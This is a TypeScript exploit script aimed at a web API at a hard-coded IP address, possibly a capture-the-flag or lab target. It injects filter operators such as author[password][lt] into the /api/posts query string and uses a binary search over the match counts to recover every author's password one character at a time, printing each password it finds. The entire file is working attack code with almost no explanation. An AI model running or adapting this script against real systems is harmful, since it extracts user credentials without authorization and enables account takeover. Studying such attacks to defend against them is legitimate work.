///////////////////////
// Configuration
///////////////////////
const targetUrl = "http://35.239.207.1:3000/api/posts";
const charSet =
  "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

// Ensure fetch is available (Node 18+ or a polyfill)
if (typeof fetch === "undefined") {
  throw new Error(
    "Fetch not available. Use Node 18+ or import a fetch polyfill (e.g., node-fetch).",
  );
}

/**
 * Performs a GET request to /api/posts with a query parameter for password comparison.
 *    e.g. ?author[password][lt]=somePrefix
 *
 * @param opr   The comparison operator: "lt" or "equals".
 * @param query The value to compare against the user's password.
 * @returns     The number of unique authors that matched the query condition.
 */
async function sendQuery(opr: "lt" | "equals", query: string): Promise<number> {
  const fullUrl = `${targetUrl}?author[password][${opr}]=${encodeURIComponent(query)}`;

  try {
    const response = await fetch(fullUrl, {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Accept-Encoding": "gzip, deflate, br",
      },
    });
    const result = await response.json();

    // Validate structure
    if (!result.posts || !Array.isArray(result.posts)) {
      console.log(
        "[!] Unexpected response structure:",
        result,
        "\n[!] URL:",
        fullUrl,
      );
      return 0;
    }

    // Gather unique authorIds from the returned posts
    const uniqueAuthors = new Set(result.posts.map((p: any) => p.authorId));
    const uniqueCount = uniqueAuthors.size;

    console.log(
      `[DEBUG] Query (opr=${opr}, query="${query}") => unique authors: ${uniqueCount}`,
    );
    return uniqueCount;
  } catch (err) {
    console.error("[!] Error in sendQuery:", err);
    return 0;
  }
}

/**
 * guessPasswordsInRange:
 *  - Attempts to find specific password strings for authors in [start, end),
 *    given a "base" prefix.
 *  - It uses a form of binary search on charSet to refine possible characters.
 *
 * @param start  The starting index of authors (e.g., how many passwords already found).
 * @param end    The ending index (non-inclusive) – how many total passwords are in scope so far.
 * @param prefix A string base that we build upon to guess the next character.
 * @returns      An array of found passwords in that range.
 */
async function guessPasswordsInRange(
  start: number,
  end: number,
  prefix: string,
): Promise<string[]> {
  let foundPasswords: string[] = [];

  // We build a structure that tracks [minCharIndex, maxCharIndex] for each author in this range.
  const rangeMap: Array<{ min: number; max: number }> = [];
  for (let i = start; i < end; i++) {
    rangeMap.push({ min: 0, max: charSet.length - 1 });
  }

  // For each author, refine the character range using binary search
  for (let i = 0; i < rangeMap.length; i++) {
    const currentRange = rangeMap[i];

    // Optional logic: if i > 0, we start from the previous max to skip repeated checks
    if (i > 0) {
      currentRange.min = rangeMap[i - 1].max;
    }

    while (currentRange.min < currentRange.max) {
      const mid = Math.ceil((currentRange.min + currentRange.max) / 2);
      const testChar = charSet[mid];
      const query = prefix + testChar;

      // Check how many authors match password < query
      const matchCount = await sendQuery("lt", query);

      /**
       * If matchCount == start + i, it means none of the authors after index i
       * matched, so the real char is >= testChar (raise min).
       * If matchCount == start + i + 1, it means the author at index i matched
       * password < query, so the real char is < testChar (lower max).
       */
      if (matchCount === start + i) {
        currentRange.min = mid;
      } else if (matchCount === start + i + 1) {
        currentRange.max = mid - 1;
      }

      console.log(
        `[DEBUG] Author index=${i}, min="${charSet[currentRange.min]}", max="${charSet[currentRange.max]}", matchCount=${matchCount}, query="${query}"`,
      );
    }

    rangeMap[i] = currentRange;
  }

  /**
   * Now we've compressed each author’s [min,max] to a single character index
   * or a small range. We'll see how many consecutive authors share the same char.
   */
  let prevCharIndex = rangeMap[0].min;
  let consecutiveCount = 1;

  // Iterate over the authors in rangeMap to group by repeated char index
  for (let i = 1; i < rangeMap.length; i++) {
    if (prevCharIndex === rangeMap[i].min) {
      // Same character as the previous => group them
      consecutiveCount++;
      continue;
    }

    // If we found a new char index, check if the "previous" char is actually correct for that group
    const testPassword = prefix + charSet[prevCharIndex];
    const isCorrect = (await sendQuery("equals", testPassword)) > 0;
    if (isCorrect) {
      console.log("[+] Found Password:", testPassword);
    } else {
      // Not correct => we recursively guess the sub-range that used the old char
      // from i - consecutiveCount to i, with the old prefix
      await guessPasswordsInRange(
        start + i - consecutiveCount,
        start + i,
        prefix + charSet[prevCharIndex],
      );
    }

    // Reset for the next char
    prevCharIndex = rangeMap[i].min;
    consecutiveCount = 1;
  }

  // After the loop, handle the final group
  const finalTestPassword = prefix + charSet[prevCharIndex];
  const finalIsCorrect = (await sendQuery("equals", finalTestPassword)) > 0;
  if (finalIsCorrect) {
    console.log("[+] Found Password:", finalTestPassword);
    foundPasswords.push(finalTestPassword);
  } else {
    // Attempt a recursive guess for the final group
    foundPasswords = foundPasswords.concat(
      await guessPasswordsInRange(
        start + rangeMap.length - consecutiveCount,
        start + rangeMap.length,
        prefix + charSet[prevCharIndex],
      ),
    );
  }

  return foundPasswords;
}

/**
 * guessPasswords:
 *  - The top-level function that guesses all possible passwords by building from scratch.
 *    It increments an index in charSet to find transitions in the matchCount for "lt" queries.
 *
 * @returns An array of all discovered password strings.
 */
async function guessPasswords(): Promise<string[]> {
  let discoveredPasswords: string[] = [];
  let currentPasswordCount = 0;

  // We iterate through the charSet to see how many new authors appear
  // when password < that char transitions from the old count to a new count.
  for (let i = 0; i < charSet.length; i++) {
    const c = charSet[i];
    const matchCount = await sendQuery("lt", c);

    if (matchCount < currentPasswordCount) {
      // This suggests an invalid or contradictory result
      throw new Error(
        "Inconsistent password count – logic error or server changed behavior.",
      );
    }

    // If matchCount didn't change, it means no new authors have a password < c
    if (matchCount === currentPasswordCount) {
      continue;
    }

    // Some new authors appeared => guess them specifically in the range [currentPasswordCount, matchCount)
    const guessChar = charSet[i - 1] || ""; // If i=0, i-1 is -1 => fallback to empty prefix
    const rangePasswords = await guessPasswordsInRange(
      currentPasswordCount,
      matchCount,
      guessChar,
    );
    discoveredPasswords = discoveredPasswords.concat(rangePasswords);

    // Update how many total passwords we've seen
    currentPasswordCount = matchCount;
  }

  return discoveredPasswords;
}

////////////////////////
// Main entry point
////////////////////////
(async function main() {
  console.log("[*] Starting password guess...");

  try {
    const guessed = await guessPasswords();
    console.log(`[***] Guessed password(s): ${JSON.stringify(guessed)}`);
  } catch (error) {
    console.error("[!] Error in main:", error);
  }

  console.log("[*] Done!");
})();
